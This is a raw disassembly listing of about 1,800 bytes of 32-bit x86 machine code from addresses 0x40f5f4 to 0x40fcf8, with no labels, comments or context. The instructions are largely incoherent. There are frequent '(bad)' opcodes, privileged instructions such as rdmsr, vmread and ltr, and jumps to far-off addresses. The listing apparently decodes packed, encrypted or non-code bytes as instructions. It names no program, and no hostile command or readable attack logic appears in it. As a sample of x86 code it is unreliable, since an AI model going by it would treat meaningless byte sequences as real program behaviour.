  40f5f4:	dec    DWORD PTR [ebx+0xfa98d7]
  40f5fa:	test   edi,edi
  40f5fc:	clc    
  40f5fd:	call   FWORD PTR [edi]
  40f5ff:	or     BYTE PTR [eax],cl
  40f601:	inc    ebp
  40f602:	dec    ebp
  40f603:	inc    DWORD PTR [ebx+0x74803114]
  40f609:	add    DWORD PTR [ebx+0x45fc00],ecx
  40f60f:	call   DWORD PTR [eax+edx*1]
  40f612:	add    ecx,DWORD PTR [ebp-0x38]
  40f615:	push   esi
  40f616:	adc    al,0x8
  40f618:	mov    edx,DWORD PTR [ebp-0x14]
  40f61b:	mov    ecx,DWORD PTR [ebp-0x4]
  40f61e:	add    DWORD PTR [ebp-0x68],0xffffff8d
  40f622:	inc    DWORD PTR [esp+esi*8]
  40f625:	inc    ebp
  40f626:	stos   BYTE PTR es:[edi],al
  40f627:	mov    edx,DWORD PTR [ebp+0x1c]
  40f62a:	add    DWORD PTR [ebp-0x10],eax
  40f62d:	mov    edx,DWORD PTR [ebp-0x70]
  40f630:	cmp    eax,DWORD PTR [eax]
  40f632:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f633:	mov    eax,DWORD PTR [eax]
  40f635:	sbb    al,0x73
  40f637:	add    BYTE PTR [ebx],0x1
  40f63a:	call   0x8971463f
  40f63f:	xor    eax,ebp
  40f641:	pop    ds
  40f642:	inc    ebp
  40f643:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  40f649:	(bad)  
  40f64a:	push   DWORD PTR [edi]
  40f64c:	mov    ecx,DWORD PTR [ebx+0x398503f8]
  40f652:	push   DWORD PTR [ebx-0x1]
  40f655:	mov    eax,DWORD PTR [ebp-0x740075]
  40f65b:	sub    eax,DWORD PTR [eax]
  40f65d:	add    eax,DWORD PTR [eax]
  40f65f:	mov    DWORD PTR [ecx+0x5f],eax
  40f662:	mov    DWORD PTR [ebx+0x28],ebx
  40f665:	ret    0xff
  40f668:	mov    ecx,DWORD PTR [ebx+0x1cc783d4]
  40f66e:	ret    
  40f66f:	mov    eax,DWORD PTR [ebp-0x6f0075]
  40f675:	add    BYTE PTR [ebp-0x7d],al
  40f678:	mov    DWORD PTR [eax],eax
  40f67a:	xor    BYTE PTR [edi+edi*8+0x20008d01],al
  40f681:	sar    bh,cl
  40f683:	test   BYTE PTR [eax+0x1],dl
  40f686:	inc    ebp
  40f687:	add    BYTE PTR [ebx],dh
  40f689:	test   BYTE PTR [ebx],0x84
  40f68c:	push   eax
  40f68d:	add    BYTE PTR [ebp+0x0],al
  40f690:	add    eax,0x86
  40f695:	add    BYTE PTR [ebx-0x7f7be340],cl
  40f69b:	add    BYTE PTR [ecx],al
  40f69d:	add    BYTE PTR [eax],al
  40f69f:	mov    esi,0x550030
  40f6a4:	mov    ecx,DWORD PTR [edi]
  40f6a6:	sbb    al,0xda
  40f6a8:	jne    0x40f6aa
  40f6aa:	mov    edi,DWORD PTR [ecx]
  40f6ac:	xor    BYTE PTR [eax+eax*1],0x84
  40f6b0:	add    eax,DWORD PTR [eax]
  40f6b2:	cld    
  40f6b3:	add    BYTE PTR [ebp-0x4f],dh
  40f6b6:	mov    eax,DWORD PTR [ecx]
  40f6b8:	cld    
  40f6b9:	add    BYTE PTR [ecx-0x1bff009b],cl
  40f6bf:	retf   0xe45
  40f6c2:	add    eax,edx
  40f6c4:	sbb    al,0xb7
  40f6c6:	dec    ebp
  40f6c7:	or     al,0x89
  40f6c9:	dec    ebp
  40f6ca:	sbb    al,0xf
  40f6cc:	inc    ebp
  40f6cd:	dec    eax
  40f6ce:	mov    eax,DWORD PTR [ebx]
  40f6d0:	sbb    al,0xf
  40f6d2:	nop
  40f6d3:	scas   al,BYTE PTR es:[edi]
  40f6d4:	add    DWORD PTR [eax],eax
  40f6d6:	add    BYTE PTR [ebp-0x7674ebbb],cl
  40f6dc:	mov    eax,gs
  40f6de:	add    bh,bh
  40f6e0:	mov    edi,edi
  40f6e2:	cmp    DWORD PTR [edi+0x72],edx
  40f6e5:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  40f6eb:	gs cmp al,0x0
  40f6ee:	je     0x40f6c6
  40f6f0:	push   eax
  40f6f1:	sar    BYTE PTR [eax],1
  40f6f3:	mov    bh,0x3e
  40f6f5:	push   cs
  40f6f6:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  40f6fc:	add    DWORD PTR [ecx+0x12],ebp
  40f6ff:	dec    edx
  40f700:	(bad)  
  40f701:	mov    eax,edx
  40f703:	in     al,dx
  40f704:	adc    DWORD PTR [ecx],esi
  40f706:	pop    esi
  40f707:	inc    ecx
  40f708:	leave  
  40f709:	or     DWORD PTR [eax],ebx
  40f70b:	gs push ebp
  40f70d:	add    ah,ch
  40f70f:	into   
  40f710:	in     al,dx
  40f711:	enter  0xb756,0xf0
  40f715:	push   cs
  40f716:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  40f720:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  40f726:	jnp    0x74417c2e
  40f72c:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  40f732:	add    BYTE PTR [edi],cl
  40f734:	mov    edi,DWORD PTR [ecx-0x78]
  40f737:	ltr    WORD PTR [ecx-0x7b]
  40f73b:	dec    DWORD PTR [edi]
  40f73d:	clc    
  40f73e:	out    0x45,eax
  40f740:	add    BYTE PTR [eax],cl
  40f742:	cmp    ebx,0xffffff8c
  40f745:	jge    0x40f747
  40f747:	jb     0x40f759
  40f749:	je     0x4ff7c9
  40f74f:	pop    edx
  40f750:	push   esi
  40f751:	mov    ecx,DWORD PTR [edi]
  40f753:	in     al,dx
  40f754:	rol    DWORD PTR [ebp+0x0],1
  40f757:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  40f75e:	cmp    DWORD PTR [ecx],0xfffffff0
  40f761:	hlt    
  40f762:	mov    esp,DWORD PTR [eax+0xf034d2b]
  40f768:	(bad)  
  40f76a:	push   eax
  40f76b:	jns    0xb840dbe9
  40f771:	lock push cs
  40f773:	ror    edx,0x3
  40f776:	test   BYTE PTR [ecx+0x5500e800],cl
  40f77c:	dec    eax
  40f77d:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  40f781:	(bad)  
  40f782:	mov    esi,0x7f33ff5f
  40f787:	inc    eax
  40f788:	test   DWORD PTR [edx],eax
  40f78a:	je     0x40f74c
  40f78c:	mov    ecx,ecx
  40f78e:	adc    DWORD PTR [ebp-0xc],0xffffffec
  40f792:	and    eax,DWORD PTR [eax+0xf0103]
  40f798:	jp     0x40f786
  40f79a:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  40f79e:	add    edx,DWORD PTR [edi+0x74]
  40f7a1:	sbb    BYTE PTR [ebp+0x4d001484],cl
  40f7a7:	add    BYTE PTR [ebp-0x74c48bbb],al
  40f7ad:	je     0x40f732
  40f7af:	cmp    eax,edi
  40f7b1:	js     0x40f7d6
  40f7b3:	add    eax,0xeb0fc003
  40f7b8:	jns    0x40f745
  40f7ba:	vmread DWORD PTR [ecx+0x45],ebx
  40f7be:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  40f7c4:	adc    al,0x8b
  40f7c6:	jge    0x40f7dc
  40f7c8:	mov    edi,DWORD PTR [eax-0x4]
  40f7cb:	add    edi,DWORD PTR [edi]
  40f7cd:	or     bh,bh
  40f7cf:	push   ebp
  40f7d0:	push   es
  40f7d1:	mov    DWORD PTR [ebp-0x4],ebx
  40f7d4:	add    edi,esi
  40f7d6:	pop    es
  40f7d7:	add    esi,DWORD PTR [edi-0x48ccf183]
  40f7dd:	mov    DWORD PTR [esp+esi*8],ecx
  40f7e0:	inc    ebp
  40f7e1:	pop    ebp
  40f7e2:	xor    DWORD PTR [esi-0x4],0x3b
  40f7e6:	add    edx,DWORD PTR [ecx+edi*1]
  40f7e9:	push   es
  40f7ea:	clc    
  40f7eb:	mov    bh,0xdb
  40f7ed:	jp     0x40f7a6
  40f7ef:	add    cl,BYTE PTR [esi]
  40f7f1:	div    DWORD PTR [edi+0x4d8b0c1c]
  40f7f7:	test   edi,edi
  40f7f9:	je     0x40f7ef
  40f7fb:	mov    eax,ecx
  40f7fd:	or     BYTE PTR [ebx],al
  40f7ff:	dec    BYTE PTR [ecx+0x7d3bec7d]
  40f805:	jbe    0x40f879
  40f807:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  40f80d:	add    ecx,DWORD PTR [esi]
  40f80f:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  40f815:	add    eax,DWORD PTR [ebx-0x287af783]
  40f81b:	je     0x40f86a
  40f81d:	mov    DWORD PTR [ecx],edi
  40f81f:	mov    esi,eax
  40f821:	hlt    
  40f822:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  40f829:	jb     0x40f7eb
  40f82b:	jmp    0x40f818
  40f82d:	xor    esi,DWORD PTR [ebx]
  40f82f:	pop    edi
  40f830:	pop    esi
  40f831:	pop    ebx
  40f832:	ret    
  40f833:	ret    0x8b
  40f836:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  40f83c:	xor    DWORD PTR [ecx],0xc
  40f83f:	pushf  
  40f840:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  40f846:	rdmsr  
  40f848:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  40f84f:	dec    ebp
  40f850:	ret    
  40f851:	mov    edi,DWORD PTR [esi-0x4]
  40f854:	pop    eax
  40f855:	dec    ebp
  40f856:	jne    0x40f7e3
  40f858:	xor    edi,esp
  40f85a:	inc    eax
  40f85b:	dec    ebp
  40f85c:	jbe    0x40f8b1
  40f85e:	inc    eax
  40f85f:	pop    ebp
  40f860:	add    edx,DWORD PTR [esi+0x8]
  40f863:	push   esp
  40f864:	dec    eax
  40f865:	push   ecx
  40f866:	mov    eax,edi
  40f868:	and    al,0xf0
  40f86a:	jo     0x40f857
  40f86c:	mov    eax,DWORD PTR [ebx]
  40f86e:	sbb    BYTE PTR [ebp+0x4d],cl
  40f871:	mov    eax,DWORD PTR [ebx]
  40f873:	nop
  40f874:	or     BYTE PTR [eax],al
  40f876:	jne    0x40f8cf
  40f878:	cmp    ebx,DWORD PTR [ebx+0x33893277]
  40f87e:	cld    
  40f87f:	xor    edi,edi
  40f881:	add    edi,DWORD PTR [ebp+0x3]
  40f884:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  40f88a:	js     0x40f810
  40f88c:	jae    0x40f890
  40f88e:	(bad)  
  40f890:	xor    al,0x5d
  40f892:	jmp    0x40f81f
  40f894:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  40f89b:	fdecstp 
  40f89d:	test   BYTE PTR [edi],ah
  40f89f:	add    bh,BYTE PTR [ebp+0x0]
  40f8a2:	add    ebx,DWORD PTR [ebp-0x77]
  40f8a5:	mov    edi,eax
  40f8a7:	cmp    al,0x0
  40f8aa:	adc    dh,BYTE PTR [ebx]
  40f8ac:	jge    0x40f8b1
  40f8ae:	mov    edi,DWORD PTR [ebx]
  40f8b0:	jl     0x40f8c1
  40f8b2:	clc    
  40f8b3:	dec    edi
  40f8b4:	jge    0x40f8b6
  40f8b6:	mov    eax,DWORD PTR [ebx]
  40f8b8:	jb     0x40f8c2
  40f8ba:	mov    ecx,DWORD PTR [ebp-0x8]
  40f8bd:	mov    edi,edi
  40f8bf:	xor    edx,DWORD PTR [eax]
  40f8c1:	add    edi,DWORD PTR [ebx]
  40f8c3:	mov    DWORD PTR [ebp-0x10],edi
  40f8c6:	inc    edi
  40f8c7:	pop    ebp
  40f8c8:	jge    0x40f905
  40f8ca:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  40f8ce:	mov    edx,0xc05d87f0
  40f8d3:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  40f8d7:	fimul  WORD PTR [eax]
  40f8d9:	fist   WORD PTR [ebp+0x1c]
  40f8dc:	in     al,dx
  40f8dd:	jne    0x40f8cb
  40f8df:	mov    edi,DWORD PTR [edx-0x7a27a10]
  40f8e5:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  40f8e9:	fdivp  st(0),st
  40f8eb:	fild   WORD PTR [ebp+0x4510f85c]
  40f8f1:	test   BYTE PTR [ebx+0x4d00fc02],cl
  40f8f7:	inc    ebp
  40f8f8:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  40f8fe:	mov    ebp,DWORD PTR [ebx-0x4]
  40f901:	adc    al,0x8b
  40f903:	rcl    DWORD PTR [eax],0x48
  40f906:	mov    esi,0x7080803
  40f90b:	fiadd  WORD PTR [ebp+0x4d]
  40f90e:	(bad)  
  40f90f:	mov    edx,DWORD PTR [edx-0x4]
  40f912:	mov    edx,DWORD PTR [ebp-0x4]
  40f915:	xor    ebx,DWORD PTR [ebx+0x330103]
  40f91b:	mov    DWORD PTR [edi+0x872dc],edi
  40f921:	xlat   BYTE PTR ds:[ebx]
  40f922:	into   
  40f923:	ffreep st(6)
  40f925:	retf   0x6c7
  40f928:	iret   
  40f929:	dec    ebp
  40f92a:	inc    ebp
  40f92b:	mov    DWORD PTR [ebx],edi
  40f92d:	fmul   QWORD PTR [edi]
  40f92f:	dec    ebp
  40f930:	jnp    0x40f965
  40f932:	add    BYTE PTR [ebx],al
  40f934:	mov    ecx,DWORD PTR [esp+edi*8]
  40f937:	inc    ebp
  40f938:	dec    ebp
  40f939:	lea    esi,[ebx]
  40f93b:	add    DWORD PTR [ebx],eax
  40f93d:	jb     0x40f97a
  40f93f:	add    BYTE PTR [edi],cl
  40f941:	inc    ebp
  40f942:	imul   eax,edi,0x858bd800
  40f948:	cld    
  40f949:	clc    
  40f94a:	mov    DWORD PTR [ebp+0x0],eax
  40f94d:	inc    DWORD PTR [eax]
  40f94f:	or     al,0xde
  40f951:	sbb    bh,0x1
  40f954:	retf   
  40f955:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  40f95c:	dec    ebp
  40f95d:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  40f963:	enter  0x12de,0xdf
  40f967:	inc    ebp
  40f968:	pop    ebp
  40f969:	dec    DWORD PTR [ebx-0x257f0ff4]
  40f96f:	add    DWORD PTR [edx],edx
  40f971:	add    BYTE PTR [ebp+0x50],dl
  40f974:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  40f97a:	xor    ecx,DWORD PTR [edx-0x38c699fd]
  40f980:	or     ah,al
  40f982:	pop    ss
  40f983:	cdq    
  40f984:	push   ebp
  40f985:	clc    
  40f986:	mov    eax,DWORD PTR [ebp-0x4]
  40f989:	xor    edx,edx
  40f98b:	add    esi,DWORD PTR [ebx]
  40f98d:	cmp    eax,DWORD PTR [ebx]
  40f98f:	hlt    
  40f990:	cmp    DWORD PTR [ebx],esp
  40f992:	or     al,BYTE PTR [ebp+0xf]
  40f995:	mov    eax,DWORD PTR [edx]
  40f997:	loopne 0x40f999
  40f999:	(bad)  
  40f99a:	mov    ecx,esi
  40f99c:	cld    
  40f99d:	pushf  
  40f99e:	pop    ebp
  40f99f:	fwait
  40f9a0:	mov    esi,DWORD PTR [edx]
  40f9a2:	lock mov eax,eax
  40f9a5:	adc    BYTE PTR [ebx],al
  40f9a7:	or     BYTE PTR [ebx+0x4d001001],0xcf
  40f9ae:	xor    ebp,DWORD PTR [edi+0x50e45189]
  40f9b4:	dec    ebp
  40f9b5:	mov    ecx,DWORD PTR [ebx-0x31390304]
  40f9bb:	(bad)  
  40f9bc:	iret   
  40f9bd:	inc    ebp
  40f9be:	(bad)  
  40f9bf:	jne    0x40fa0e
  40f9c1:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  40f9c7:	(bad)  
  40f9c8:	cmp    ebx,eax
  40f9ca:	je     0x40f952
  40f9cc:	add    edi,edi
  40f9ce:	or     bh,bh
  40f9d0:	dec    ebp
  40f9d1:	inc    ebp
  40f9d2:	mov    esi,DWORD PTR [ebx]
  40f9d4:	cld    
  40f9d5:	add    ecx,esi
  40f9d7:	cmp    ecx,DWORD PTR [eax-0xc]
  40f9da:	mov    edx,DWORD PTR [edi]
  40f9dc:	or     BYTE PTR [ebp-0x7c],al
  40f9df:	mov    ebx,DWORD PTR [ebx-0x7639cd18]
  40f9e5:	test   BYTE PTR [ebx+ebx*4],cl
  40f9e8:	inc    ebp
  40f9e9:	xor    bh,BYTE PTR [esi]
  40f9eb:	mov    DWORD PTR [eax+ebp*8+0x10ef8b],ebx
  40f9f2:	jne    0x40f9bb
  40f9f4:	mov    ebp,esp
  40f9f6:	fcomp  DWORD PTR [ebx]
  40f9f8:	add    BYTE PTR [ecx],al
  40f9fa:	inc    DWORD PTR [ebp-0x75]
  40f9fd:	(bad)  
  40f9fe:	cld    
  40f9ff:	add    al,0xce
  40fa01:	mov    ecx,edi
  40fa03:	cld    
  40fa04:	inc    ebp
  40fa05:	fidivr WORD PTR [ebx]
  40fa07:	fbstp  TBYTE PTR [ebp-0x3e]
  40fa0a:	mov    eax,DWORD PTR [eax]
  40fa0c:	adc    BYTE PTR [ebx-0x3974038b],cl
  40fa12:	fadd   st,st(7)
  40fa14:	add    BYTE PTR [ebp-0x1],al
  40fa17:	mov    ecx,DWORD PTR [esp+edi*8]
  40fa1a:	inc    ebp
  40fa1b:	mov    bh,0xc7
  40fa1e:	loopne 0x40fa65
  40fa20:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  40fa26:	sbb    dh,BYTE PTR [ebx]
  40fa28:	pushf  
  40fa29:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  40fa2f:	mov    eax,edi
  40fa31:	cwde   
  40fa32:	inc    ebp
  40fa33:	inc    ebp
  40fa34:	jne    0x40f9c1
  40fa36:	mov    esp,esp
  40fa38:	clc    
  40fa39:	add    al,0x4d
  40fa3b:	mov    DWORD PTR [ebx],esi
  40fa3d:	or     al,0x33
  40fa3f:	inc    ebp
  40fa40:	lea    ecx,[ebx-0x398d13fd]
  40fa46:	add    bh,al
  40fa48:	inc    ebp
  40fa49:	ror    DWORD PTR [ebx+0x45d829],0x8b
  40fa50:	add    ebp,esp
  40fa52:	shufps xmm1,xmm3,0xc7
  40fa56:	(bad)  
  40fa57:	jmp    0x74863580
  40fa5c:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  40fa62:	hlt    
  40fa63:	mov    ecx,DWORD PTR [edi]
  40fa65:	fadd   DWORD PTR [ebp+0x0]
  40fa68:	xor    ecx,DWORD PTR [edi]
  40fa6a:	add    ecx,ecx
  40fa6c:	cmp    edi,edi
  40fa6e:	pmuludq mm7,QWORD PTR [edx+0x50]
  40fa72:	(bad)  
  40fa73:	jmp    0x40fa00
  40fa75:	mov    edi,esp
  40fa77:	or     al,0xc6
  40fa79:	inc    ebp
  40fa7a:	(bad)  
  40fa7b:	mov    eax,DWORD PTR [ebp+0x10]
  40fa7e:	jne    0x40fa09
  40fa80:	mov    eax,DWORD PTR [ecx]
  40fa82:	clc    
  40fa83:	add    BYTE PTR [ebp-0x40],cl
  40fa86:	xor    edx,DWORD PTR [eax-0x73]
  40fa89:	jne    0x40fa8c
  40fa8b:	push   DWORD PTR [edx+0x8]
  40fa8e:	add    BYTE PTR [ebp+0x45],al
  40fa91:	mov    ebp,ecx
  40fa93:	cld    
  40fa94:	add    BYTE PTR [ebp+0x0],cl
  40fa97:	xor    eax,DWORD PTR [ebp+0x3]
  40fa9a:	mov    DWORD PTR [ebx],edi
  40fa9c:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  40faa2:	sub    eax,0x5d330e4d
  40faa7:	lea    esi,[ebx]
  40faa9:	add    DWORD PTR [ebx],eax
  40faab:	jb     0x40fa96
  40faad:	add    BYTE PTR [eax],al
  40faaf:	inc    ebp
  40fab0:	add    bl,ch
  40fab2:	inc    ebp
  40fab3:	mov    esi,DWORD PTR [ebx]
  40fab5:	or     al,0x3
  40fab7:	(bad)  
  40fab8:	mov    edi,eax
  40faba:	in     al,dx
  40fabb:	scas   eax,DWORD PTR es:[edi]
  40fabc:	inc    ebp
  40fabd:	mov    esi,DWORD PTR [ebx]
  40fabf:	in     al,0x3
  40fac1:	add    al,0x89
  40fac3:	mov    ecx,DWORD PTR [eax+edi*8]
  40fac6:	dec    ebp
  40fac7:	(bad)  
  40fac8:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3165]
  40facf:	mov    ecx,eax
  40fad1:	cld    
  40fad2:	push   es
  40fad3:	dec    ebp
  40fad4:	add    al,0x33
  40fad6:	mov    DWORD PTR [ebx],eax
  40fad8:	in     al,dx
  40fad9:	cmp    DWORD PTR [ebp-0x67],eax
  40fadc:	mov    eax,DWORD PTR [ebp-0xba0068]
  40fae2:	mov    edx,DWORD PTR [ebp-0x4]
  40fae5:	mov    ecx,DWORD PTR [ebp-0x2c]
  40fae8:	xor    eax,DWORD PTR [ebp+0x3]
  40faeb:	cmp    DWORD PTR [ebx],0x8b32749a
  40faf1:	xor    edi,esp
  40faf3:	jmp    0xff74f845
  40faf8:	add    ecx,DWORD PTR [ebp-0x3f]
  40fafb:	xor    ebx,DWORD PTR [edi]
  40fafd:	add    eax,ecx
  40faff:	cmp    ebx,DWORD PTR [eax]
  40fb01:	mov    ecx,DWORD PTR [ebp-0x4]
  40fb04:	mov    ecx,DWORD PTR [eax]
  40fb06:	adc    BYTE PTR [ebp-0x80],al
  40fb09:	jmp    0x40fb0c
  40fb0b:	mov    eax,DWORD PTR [eax]
  40fb0d:	cld    
  40fb0e:	mov    bh,0xc6
  40fb10:	push   ecx
  40fb11:	(bad)  
  40fb12:	jne    0x40fb72
  40fb14:	dec    ecx
  40fb16:	or     BYTE PTR [ecx+ebx*1],cl
  40fb19:	push   ebp
  40fb1a:	inc    ebp
  40fb1b:	in     al,dx
  40fb1c:	add    ebp,esp
  40fb1e:	or     bh,al
  40fb20:	dec    ebp
  40fb21:	cld    
  40fb22:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  40fb28:	xor    DWORD PTR [edx],0x2
  40fb2b:	pushf  
  40fb2c:	dec    DWORD PTR [ebx+0x45510cf4]
  40fb32:	mov    DWORD PTR [ebx+0x5445fc0c],ecx
  40fb38:	mov    edx,DWORD PTR [ecx+0xc]
  40fb3b:	xor    eax,esi
  40fb3d:	mov    edx,0xc172c7
  40fb42:	inc    ebp
  40fb43:	mov    esi,DWORD PTR [ebp+0x8]
  40fb46:	mov    eax,edx
  40fb48:	call   0x84c5c23d
  40fb4d:	add    DWORD PTR [ebx-0x76bace00],ebx
  40fb53:	mov    ebp,eax
  40fb55:	or     BYTE PTR [eax],dl
  40fb57:	jo     0x40fba6
  40fb59:	push   edi
  40fb5a:	xor    esi,DWORD PTR [ebp+0x3]
  40fb5d:	(bad)  
  40fb5e:	pmulhuw mm0,mm1
  40fb61:	test   DWORD PTR [ebp-0x8],ecx
  40fb64:	mov    DWORD PTR [ebp-0x67],eax
  40fb67:	mov    eax,DWORD PTR [ebp-0x4]
  40fb6a:	xor    edi,DWORD PTR [ebp-0x73]
  40fb6d:	xor    eax,DWORD PTR [ebx]
  40fb6f:	xor    esi,DWORD PTR [edx+0x3]
  40fb72:	add    BYTE PTR [ecx],bh
  40fb74:	inc    ebp
  40fb75:	(bad)  
  40fb76:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  40fb7c:	mov    DWORD PTR [eax],0x750f0004
  40fb82:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  40fb88:	lock add BYTE PTR [ebp+0x0],cl
  40fb8c:	mov    esi,DWORD PTR [ebp-0x18]
  40fb8f:	mov    ebp,edx
  40fb91:	or     al,0x72
  40fb93:	ja     0x40fb95
  40fb95:	mov    edx,esi
  40fb97:	cld    
  40fb98:	(bad)  
  40fb9b:	cli    
  40fb9c:	mov    esi,DWORD PTR [ebp-0x4]
  40fb9f:	cmp    ecx,esi
  40fba1:	bswap  edi
  40fba3:	(bad)
  40fba7:	mov    esi,DWORD PTR [ebp-0x4]
  40fbaa:	mov    esi,ecx
  40fbac:	clc    
  40fbad:	repnz add esi,DWORD PTR [ebp+0x45]
  40fbb1:	push   ebx
  40fbb2:	xor    eax,DWORD PTR [ebp+0x3]
  40fbb5:	cmp    al,0x5f
  40fbb7:	pushf  
  40fbb8:	pop    ebx
  40fbb9:	jmp    0x40fc80
  40fbbe:	mov    esi,DWORD PTR [ebp-0x7d]
  40fbc1:	xor    ebp,DWORD PTR [eax]
  40fbc3:	lea    eax,[ebp-0x8]
  40fbc6:	xor    edx,esi
  40fbc8:	pushf  
  40fbc9:	out    dx,eax
  40fbca:	(bad)  
  40fbcb:	neg    eax
  40fbcd:	ins    DWORD PTR es:[edi],dx
  40fbce:	test   esi,edi
  40fbd0:	clc    
  40fbd1:	pop    esp
  40fbd2:	inc    ebp
  40fbd3:	or     BYTE PTR [ecx+0x450f0c7d],cl
  40fbd9:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  40fbdf:	add    cl,al
  40fbe1:	jne    0x40fb7e
  40fbe3:	mov    esi,DWORD PTR [edx]
  40fbe5:	in     al,dx
  40fbe6:	push   esi
  40fbe7:	xor    BYTE PTR [ebp-0xe],dh
  40fbea:	add    edi,esi
  40fbec:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  40fbf2:	add    cl,bh
  40fbf4:	mov    edi,DWORD PTR [ebp+0x8]
  40fbf7:	mov    DWORD PTR [ebp-0x14],esi
  40fbfa:	add    esi,DWORD PTR [ebp+0x3c]
  40fbfd:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  40fc03:	mov    ah,0x3e
  40fc05:	fwait
  40fc06:	pushf  
  40fc07:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  40fc0d:	jne    0x40fb9a
  40fc0f:	mov    ecx,DWORD PTR [esp+ebp*8]
  40fc12:	icebp  
  40fc13:	icebp  
  40fc14:	shl    edx,0xf2
  40fc17:	(bad)  
  40fc18:	mov    ah,0x16
  40fc1a:	push   eax
  40fc1b:	jne    0x40fbb0
  40fc1d:	mov    ecx,DWORD PTR [edi]
  40fc1f:	in     al,dx
  40fc20:	jmp    0x40fc13
  40fc22:	add    dl,dh
  40fc24:	mov    edi,esi
  40fc26:	or     al,0x8
  40fc28:	inc    ebp
  40fc29:	jne    0x40fc2e
  40fc2b:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  40fc31:	ret    
  40fc32:	or     bh,bh
  40fc34:	jge    0x40fc1e
  40fc36:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  40fc3c:	xor    edi,eax
  40fc3e:	add    esi,DWORD PTR [ebp-0x77]
  40fc41:	mov    ebx,esp
  40fc43:	clc    
  40fc44:	neg    DWORD PTR [ebp-0x7c]
  40fc47:	xor    eax,DWORD PTR [eax]
  40fc49:	cmp    eax,DWORD PTR [eax]
  40fc4b:	repz jne 0x40fbe3
  40fc4e:	xor    eax,DWORD PTR [ecx]
  40fc50:	add    ebx,DWORD PTR [eax]
  40fc52:	mov    DWORD PTR [ebp-0x8],eax
  40fc55:	mov    eax,edi
  40fc57:	cld    
  40fc58:	lock pop eax
  40fc5a:	test   DWORD PTR [ebx],esi
  40fc5c:	clc    
  40fc5d:	add    edx,DWORD PTR [edi-0x740bff77]
  40fc63:	fdivp  st(4),st
  40fc65:	test   ecx,esi
  40fc67:	(bad)  
  40fc68:	jnp    0x40fc69
  40fc6a:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  40fc70:	jae    0x40fbfd
  40fc72:	sub    edi,esp
  40fc74:	(bad)  
  40fc75:	shl    DWORD PTR [eax-0x3e],0x89
  40fc79:	leave  
  40fc7a:	call   0x8196b387
  40fc7f:	in     al,dx
  40fc80:	(bad)  
  40fc81:	in     al,dx
  40fc82:	add    bh,al
  40fc84:	mov    esp,edi
  40fc86:	in     al,dx
  40fc87:	test   DWORD PTR [ebp-0x8],edi
  40fc8a:	mov    eax,DWORD PTR [ebp+0x2b]
  40fc8d:	xor    al,BYTE PTR [ebx]
  40fc8f:	pushf  
  40fc90:	jnp    0x572ff8c9
  40fc96:	xor    edx,DWORD PTR [ecx+ecx*4+0x51]
  40fc9a:	loopne 0x40fccf
  40fc9c:	jne    0x40fc59
  40fc9e:	mov    esi,DWORD PTR [edx-0x20]
  40fca1:	add    BYTE PTR [ebp-0x3d],bh
  40fca4:	xor    eax,DWORD PTR [ebp-0x73]
  40fca7:	mov    edi,DWORD PTR [esi]
  40fca9:	cld    
  40fcaa:	jb     0x40fc72
  40fcac:	add    bl,al
  40fcae:	jne    0x40fcf5
  40fcb0:	mov    edx,DWORD PTR [edi-0x10]
  40fcb3:	jge    0x40fd32
  40fcb5:	mov    esi,DWORD PTR [ebx]
  40fcb7:	lock add ecx,DWORD PTR [ebp+0x3b]
  40fcbb:	xor    esi,DWORD PTR [ebp-0x77]
  40fcbe:	mov    esi,eax
  40fcc0:	lock inc ebp
  40fcc2:	jge    0x40fcf5
  40fcc4:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  40fccb:	dec    ebp
  40fccc:	mov    esi,DWORD PTR [ebx]
  40fcce:	loopne 0x40fc59
  40fcd0:	jge    0x40fcca
  40fcd2:	add    DWORD PTR [ebp-0x7d],eax
  40fcd5:	icebp  
  40fcd6:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  40fcdd:	dec    ebp
  40fcde:	hlt    
  40fcdf:	xor    ebx,DWORD PTR [ebp-0x77]
  40fce2:	mov    esi,esp
  40fce4:	in     al,0x45
  40fce6:	jge    0x40fd25
  40fce8:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  40fcef:	dec    ebp
  40fcf0:	push   esp
  40fcf1:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  40fcf7:	inc    ebp
  40fcf8:	hlt    
